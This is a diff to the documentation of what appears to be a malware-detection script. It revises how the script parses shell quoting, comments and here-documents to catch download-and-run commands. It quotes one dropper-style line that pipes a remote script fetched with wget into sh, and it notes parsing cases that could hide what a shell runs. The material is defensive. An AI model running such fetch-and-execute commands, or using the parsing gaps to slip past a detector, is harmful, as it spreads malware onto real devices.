@@ -118,17 +118,18 @@ This script also detects:
     Tool and server count together only within one command: a comment, `||`, `;`, `&&` or
     `&` in between separates them. A line that ends in `\` goes on in the next, as in
     `sh`: not when the `\` ends a comment, not after `\\`, and never in a crontab or a
-    keep list, which are read line by line. Quotes are read as `sh` reads them (since
-    2.54): a `;`, `&`, `|` or `#` inside a quoted string, as in
+    keep list, which are read line by line. Quotes on one line are read as `sh` reads them
+    (since 2.54): a `;`, `&`, `|` or `#` inside a quoted string, as in
     `wget -qO- "http://…/ni.sh?id=1&arch=arm" | sh`, neither separates nor starts a
     comment, unless the string is a command itself (after `sh -c`, `su -c`, `eval`,
-    `trap`, `watch`, `ssh`, `xargs` and the like, or from `$(` on in double quotes). A
-    string of data over several lines is one command. Where this could hide what `sh`
-    runs, the plain reading of 2.53 is used instead: in the text of a here-document, which
-    is read line by line as commands, for a string still open after 20 lines or at the end
-    of the file, and for a line of more than 4096 characters. A script that keeps the
-    address in a variable and fetches from it in another command is therefore only
-    `REVIEW`,
+    `trap`, `watch`, `ssh`, `xargs` and the like). Such a line is read plainly as well, as
+    in 2.53, so that a quote `sh` reads otherwise hides nothing. Only the plain reading is
+    used for a quote that does not close on its line, for `$(` or a backquote inside
+    double quotes, for `$'…'`, for the text of a here-document and for a line of more than
+    4096 characters. A string or here-document over several lines is read line by line,
+    as in 2.53: a line in it that starts with one of the malware's paths counts as a
+    command that runs it. A script that keeps the address in a variable and fetches from
+    it in another command is therefore only `REVIEW`,
   - a process that runs one of the malware's files: as the program, under its name, as
     the script a shell runs, in `sh -c` or in a loop. A command that only names such a
     path, such as `less` on a log, is `REVIEW` and is not stopped,
